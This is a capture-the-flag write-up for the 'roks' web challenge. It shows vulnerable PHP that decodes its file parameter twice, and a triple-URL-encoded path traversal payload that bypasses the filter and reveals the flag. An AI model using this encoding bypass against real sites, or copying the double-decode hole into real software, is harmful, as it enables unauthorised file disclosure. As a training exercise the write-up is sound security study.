**Name: Sen0rC4**

**Challenge Name: roks**

**Category: Web**

**Points: 100**

## Challenge:

My rock enthusiast friend made a website to show off some of his pictures. Could you do something with it?
Attachments

[roks.zip](files/roks.zip) 

## Approach:

When going to the site you are greeted by a button that picks a random picture of a rock.

If you intercept the request with burp, we see it uses *file* inclusion. So I am thinking path traversal.

```GET /file.php?file=image4 HTTP/1.1
Host: roks.chal.imaginaryctf.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://roks.chal.imaginaryctf.org/
Cookie: _ga_0LKSSBL38W=GS1.1.1690084714.5.1.1690084784.0.0.0; _ga=GA1.1.865862315.1690061016; _ga_BHMLHVLGF2=GS1.1.1690079570.3.0.1690079574.0.0.0
```

However, when we try to path traverse we recieve the ==stop hacking you hackers== image.

`/file.php?file=../../../../../../flag.png == stop hacking you hackers`

Lets take a look at the provided source code:


```<?php
  $filename = urldecode($_GET["file"]);
  if (str_contains($filename, "/") or str_contains($filename, ".")) {
    $contentType = mime_content_type("stopHacking.png");
    header("Content-type: $contentType");
    readfile("stopHacking.png");
  } else {
    $filePath = "images/" . urldecode($filename);
    $contentType = mime_content_type($filePath);
    header("Content-type: $contentType");
    readfile($filePath);
  }
?>
```

Website dosent allow "." or "/"

looks like it urldecodes once to check for . and /

it then decodes again to grab the rok file name

So we should url encode our request url twice to make sure it dosent see our "." or "/".

CyberChef will encode "." if you check the "encode all special characters

It also allows you to string together multiple encodes.

`%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fflag%252Epng`


We still get stop hacking image

I did some more enumeration and went to robots.txt and we see the site is made with apache.... which url decodes once before the site sees the request

If we url encode 3 times we should be able to path traverse

request sent: `http://roks.chal.imaginaryctf.org/file.php?file=%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252Fflag%25252Epng`

flag: `ictf{tr4nsv3rs1ng_0v3r_r0k5_6a3367}`